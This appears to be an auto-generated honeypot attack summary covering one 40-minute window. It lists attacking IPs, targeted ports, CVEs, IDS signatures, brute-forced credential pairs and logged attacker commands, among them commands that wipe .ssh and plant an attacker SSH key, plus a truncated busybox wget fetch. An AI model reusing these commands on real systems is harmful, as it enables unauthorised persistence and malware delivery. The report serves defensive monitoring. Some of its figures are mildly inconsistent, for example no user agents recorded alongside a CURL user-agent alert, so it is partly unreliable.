Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-06T23:01:40Z
**Timeframe:** 2025-10-06T22:20:01Z to 2025-10-06T23:00:02Z
**Files Used:**
- agg_log_20251006T222001Z.json
- agg_log_20251006T224001Z.json
- agg_log_20251006T230002Z.json

**Executive Summary**

This report summarizes 12,699 attacks recorded across three honeypot log files. The most targeted honeypot was Cowrie, with 4,783 events. The top attacking IP address was 147.45.193.115 with 1,260 attacks. The most targeted port was port 25 (SMTP) with 1,309 attempts. A number of CVEs were detected, with CVE-2002-0013 and CVE-2002-0012 being the most frequent. Attackers attempted a variety of commands, primarily focused on reconnaissance and establishing persistence.

**Detailed Analysis**

**Attacks by Honeypot:**
- Cowrie: 4783
- Honeytrap: 2834
- Suricata: 1789
- Mailoney: 1309
- Ciscoasa: 1221
- Sentrypeer: 438
- Dionaea: 103
- ElasticPot: 26
- ConPot: 34
- Adbhoney: 34
- Redishoneypot: 40
- Tanner: 28
- H0neytr4p: 21
- Miniprint: 18
- Honeyaml: 12
- Medpot: 4
- Heralding: 3
- Ipphoney: 2

**Top Attacking IPs:**
- 147.45.193.115: 1260
- 86.54.42.238: 1224
- 80.94.95.238: 853
- 197.248.104.19: 382
- 190.89.177.113: 352
- 172.86.95.98: 403
- 102.88.137.80: 322
- 107.173.61.177: 334
- 45.157.150.160: 243
- 128.199.24.112: 248
- 109.195.108.173: 199
- 14.103.135.184: 199
- 186.122.177.140: 159
- 74.225.17.36: 174
- 118.139.164.171: 125
- 107.170.36.5: 99
- 68.183.207.213: 95
- 103.220.207.174: 94
- 83.222.7.93: 89

**Top Targeted Ports/Protocols:**
- 25: 1309
- 22: 723
- 5060: 438
- 8333: 85
- 5903: 97
- 23: 42
- TCP/80: 37
- TCP/22: 51
- 6379: 40
- 80: 29
- 9200: 23
- 445: 32
- 5907: 51
- 5908: 50
- 5909: 50
- 81: 34

**Most Common CVEs:**
- CVE-2002-0013 CVE-2002-0012
- CVE-2019-11500 CVE-2019-11500
- CVE-2021-3449 CVE-2021-3449
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2005-4050
- CVE-2018-11776

**Commands Attempted by Attackers:**
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- cat /proc/cpuinfo | grep name | wc -l
- Enter new UNIX password:
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- cat /proc/cpuinfo | grep model | grep name | wc -l
- top
- uname
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget ...
- echo "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps" | sh
- curl2

**Signatures Triggered:**
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET INFO Reserved Internal IP Traffic
- ET SCAN Potential SSH Scan
- ET CINS Active Threat Intelligence Poor Reputation IP group 49
- ET CINS Active Threat Intelligence Poor Reputation IP group 51
- ET DROP Spamhaus DROP Listed Traffic Inbound group 28
- ET CINS Active Threat Intelligence Poor Reputation IP group 50
- ET CINS Active Threat Intelligence Poor Reputation IP group 48
- ET SCAN Suspicious inbound to PostgreSQL port 5432
- GPL INFO SOCKS Proxy attempt
- ET INFO CURL User Agent

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34: 18
- vpn/Password1: 6
- tempuser/password@123: 4
- devops/devops!: 4
- devops/3245gs5662d34: 7
- minecraft/minecraft1234: 4
- amir/amir123: 4
- botuser/12345: 3
- temp/temp1: 3
- odoo/Password123!: 3
- tempuser/3245gs5662d34: 3
- stack/12345: 3
- student/student123123: 3
- mysql/mysql12345: 4
- elasticsearch/elasticsearch!123: 4

**Files Uploaded/Downloaded:**
- wget.sh;: 16
- w.sh;: 4
- c.sh;: 4

**HTTP User-Agents:**
- No user agents were recorded in the logs.

**SSH Clients and Servers:**
- No specific SSH clients or servers were identified in the logs.

**Top Attacker AS Organizations:**
- No attacker AS organizations were recorded in the logs.

**Key Observations and Anomalies**

- A significant amount of scanning activity was observed, particularly for MS Terminal Server on non-standard ports, SSH, and PostgreSQL.
- The most common commands executed by attackers are related to reconnaissance of the system's hardware and user accounts.
- Several attackers attempted to add their SSH key to the `authorized_keys` file for persistent access.
- Attackers are using wget and curl to download and execute scripts, a common tactic for malware propagation.
- The lack of HTTP User-Agents, SSH client/server information, and AS organization data might indicate that the honeypots used to capture this information did not receive any relevant traffic during this period.
